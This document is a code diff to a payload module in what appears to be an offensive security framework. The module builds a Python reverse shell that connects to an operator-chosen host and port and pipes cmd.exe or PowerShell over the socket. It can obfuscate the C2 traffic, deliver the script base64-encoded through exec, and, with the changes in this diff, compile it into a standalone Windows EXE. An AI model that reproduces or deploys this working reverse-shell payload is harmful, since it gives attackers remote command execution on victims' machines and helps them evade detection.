@@ -21,40 +21,27 @@ class Module(Payload):
 	shell_binary = OptString('cmd.exe', 'Shell to use (cmd.exe or powershell.exe)', True, True)
 	python_binary = OptString("python", "Python binary (python or py)", True)
 	encoder = OptString("", "Encoder", False, True)
+	compile_exe = OptBool(False, "Compile to EXE (requires Zig)", False, True)
+	standalone_exe = OptBool(False, "Standalone EXE (embed Python, no install needed; requires embeddable zip)", False, True)
+	output_path = OptString("", "Output EXE path when compile_exe=true (default: payload.exe)", False, True)
+	embeddable_path = OptString("", "Path to pythonX.Y-embed-amd64.zip (standalone only)", False, True)
 
-	def generate(self):
-		host = str(self.lhost)
-		port = int(self.lport)
-		shell = str(self.shell_binary).replace("'", "'\"'\"'")
-		py = str(self.python_binary)
-
-		obf = self._get_obfuscator_instance()
-		if obf is not None and self._is_obfuscator_compatible(obf) and hasattr(obf, "generate_client_code"):
-			client_code = obf.generate_client_code(self._get_client_language())
-			if client_code:
-				# Obfuscated C2: same obfuscator/key as listener so traffic matches
-				on_connect = "_obf_send_client_hello(s)\n" if "_obf_send_client_hello" in client_code else ""
-				script = (
-					"import socket,subprocess,threading\n"
-					+ client_code + "\n"
-					+ f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
-					+ f"s.connect(('{host}',{port}))\n"
-					+ on_connect
-					+ f"p=subprocess.Popen(['{shell}'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
-					"def r():\n while True:\n  try: d=s.recv(4096)\n  except: break\n  if not d: break\n  p.stdin.write(_obf_decode(d)); p.stdin.flush()\n"
-					"def w():\n buf=b''\n while True:\n  try: c=p.stdout.read(1)\n  except: break\n  if not c: break\n  buf+=c\n  if c==b'\\n' or len(buf)>=64: s.sendall(_obf_encode(buf)); buf=b''\n if buf: s.sendall(_obf_encode(buf))\n"
-					"t1,t2=threading.Thread(target=r),threading.Thread(target=w)\nt1.daemon=t2.daemon=True\nt1.start();t2.start()\nt1.join();t2.join()\n"
-				)
-				encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
-				return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
-		if obf is not None and not self._is_obfuscator_compatible(obf):
-			from core.output_handler import print_warning
-			lang = self._get_client_language() or "?"
-			supported = getattr(obf, "get_supported_client_languages", lambda: [])()
-			print_warning(f"Obfuscator does not support client language '{lang}' for this payload (supported: {supported}). Generating without obfuscation.")
-
-		# No obfuscator or incompatible: raw relay (listener must NOT use obfuscator)
-		script = (
+	def _build_script(self, host: str, port: int, shell: str, obf_client_code: str = None) -> str:
+		"""Build the Python script (used by generate and get_python_script)."""
+		if obf_client_code:
+			on_connect = "_obf_send_client_hello(s)\n" if "_obf_send_client_hello" in obf_client_code else ""
+			return (
+				"import socket,subprocess,threading\n"
+				+ obf_client_code + "\n"
+				+ f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
+				+ f"s.connect(('{host}',{port}))\n"
+				+ on_connect
+				+ f"p=subprocess.Popen(['{shell}'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)\n"
+				"def r():\n while True:\n  try: d=s.recv(4096)\n  except: break\n  if not d: break\n  p.stdin.write(_obf_decode(d)); p.stdin.flush()\n"
+				"def w():\n buf=b''\n while True:\n  try: c=p.stdout.read(1)\n  except: break\n  if not c: break\n  buf+=c\n  if c==b'\\n' or len(buf)>=64: s.sendall(_obf_encode(buf)); buf=b''\n if buf: s.sendall(_obf_encode(buf))\n"
+				"t1,t2=threading.Thread(target=r),threading.Thread(target=w)\nt1.daemon=t2.daemon=True\nt1.start();t2.start()\nt1.join();t2.join()\n"
+			)
+		return (
 			"import socket,subprocess,threading\n"
 			f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
 			f"s.connect(('{host}',{port}))\n"
@@ -79,5 +66,49 @@ class Module(Payload):
 			"t1.start();t2.start()\n"
 			"t1.join();t2.join()\n"
 		)
+
+	def get_python_script(self):
+		"""Return raw Python script for compilation to EXE."""
+		host = str(self.lhost)
+		port = int(self.lport)
+		shell = str(self.shell_binary).replace("'", "'\"'\"'")
+		obf = self._get_obfuscator_instance()
+		obf_code = None
+		if obf and self._is_obfuscator_compatible(obf) and hasattr(obf, "generate_client_code"):
+			obf_code = obf.generate_client_code(self._get_client_language())
+		return self._build_script(host, port, shell, obf_code)
+
+	def generate(self):
+		host = str(self.lhost)
+		port = int(self.lport)
+		shell = str(self.shell_binary).replace("'", "'\"'\"'")
+		py = str(self.python_binary)
+
+		obf = self._get_obfuscator_instance()
+		obf_code = None
+		if obf and self._is_obfuscator_compatible(obf) and hasattr(obf, "generate_client_code"):
+			obf_code = obf.generate_client_code(self._get_client_language())
+		if obf and not self._is_obfuscator_compatible(obf):
+			from core.output_handler import print_warning
+			lang = self._get_client_language() or "?"
+			supported = getattr(obf, "get_supported_client_languages", lambda: [])()
+			print_warning(f"Obfuscator does not support client language '{lang}' for this payload (supported: {supported}). Generating without obfuscation.")
+
+		script = self._build_script(host, port, shell, obf_code)
+
+		# Compile to EXE if requested
+		if self.compile_exe:
+			import os
+			out = (self.output_path or "").strip()
+			if not out:
+				out = os.path.join("output", f"payload_{host}_{port}.exe")
+			out = os.path.abspath(out)
+			standalone = bool(self.standalone_exe)
+			emb = (str(self.embeddable_path or "")).strip() or None
+			if self.compile_python_to_exe(output_path=out, standalone=standalone, embeddable_path=emb):
+				return out
+			from core.output_handler import print_warning
+			print_warning("EXE compilation failed, falling back to Python command")
+
 		encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
 		return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
